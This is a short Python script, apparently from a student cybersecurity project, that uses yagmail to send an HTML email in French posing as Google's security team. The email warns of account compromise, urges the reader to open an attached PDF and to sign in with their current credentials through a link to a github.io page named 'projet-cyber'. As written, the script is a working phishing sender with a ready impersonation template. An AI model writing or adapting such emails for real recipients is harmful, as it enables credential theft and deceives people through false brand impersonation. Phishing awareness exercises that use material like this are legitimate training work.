import yagmail
import time
import os
from dotenv import load_dotenv


import subprocess
import re

# https://en.wikipedia.org/wiki/List_of_the_most_common_passwords

load_dotenv()
sender_email = os.environ.get('EMAIL')
sender_password = os.environ.get('PASSWORD')

recipient_email = 'maxflk13@gmail.com'
for i in range(1, 2):
    try:
        yag = yagmail.SMTP(sender_email, sender_password)
        yag.send(
            to=recipient_email,
            subject='Notification de sécurité pour votre Compte Google',
            contents = """<body style="color:black;">
                            <h1><strong>Ceci est une notification urgente concernant la sécurité de votre compte Google.</strong></h1>
                            <img style="height: 10em;" src="https://i0.wp.com/mandry.club/wp-content/uploads/2023/08/seguridad-google.webp?resize=870%2C400&ssl=1">
                            <p>Nous avons détecté des activités inhabituelles suggérant une possible compromission de votre compte Google. Afin de prévenir tout accès non autorisé et garantir la sécurité de vos informations personnelles, nous vous demandons instamment de changer votre mot de passe dès que possible. Veuillez suivre ces étapes sans délai :</p>
                            <li>- <strong style="color:red;">Consultez la pièce jointe de ce courriel</strong> pour en savoir plus sur les meilleures pratiques de sécurisation des mots de passe.</li>
                            <li>- Connectez-vous à votre compte Google en utilisant vos identifiants actuels via ce <a href="https://flkprod.github.io/docs/projet-cyber.html" target="_blank">lien</a>.</li>
                            <li>- Accédez aux paramètres de sécurité de votre compte.</li>
                            <li>- Sélectionnez l'option 'Changer le mot de passe' et suivez les instructions pour créer un nouveau mot de passe solide.</li>
                            <p><strong>Votre sécurité en ligne est notre priorité absolue.</strong> Assurez-vous que votre nouveau mot de passe est unique, complexe et qu'il n'est pas utilisé pour d'autres comptes. Si vous avez déjà utilisé ce mot de passe pour d'autres services, nous vous recommandons vivement de mettre à jour ces comptes également. Ne pas agir rapidement pourrait compromettre davantage la sécurité de votre compte et des données associées. Nous vous encourageons à agir immédiatement pour minimiser les risques potentiels.</p>
                            <p>Merci de votre coopération et de votre compréhension. Si vous avez des questions ou besoin d'aide, n'hésitez pas à nous contacter.</p>
                            <p>Cordialement,</p>
                            <p style="color: blue;">L'équipe de sécurité Google</p>
                            <img style="height: 5em;" src="https://www.intego.com/mac-security-blog/wp-content/uploads/2016/01/google-security-privacy-settings.jpeg">
                            </body>
                    """,
                    attachments = ['C:\\Users\\maxfl\\Desktop\\Conseils pour securiser votre compte.pdf']
            )
        print("E-mail envoyé!")
    except Exception as e:
        print("Erreur lors de l'envoi de l'e-mail:", str(e))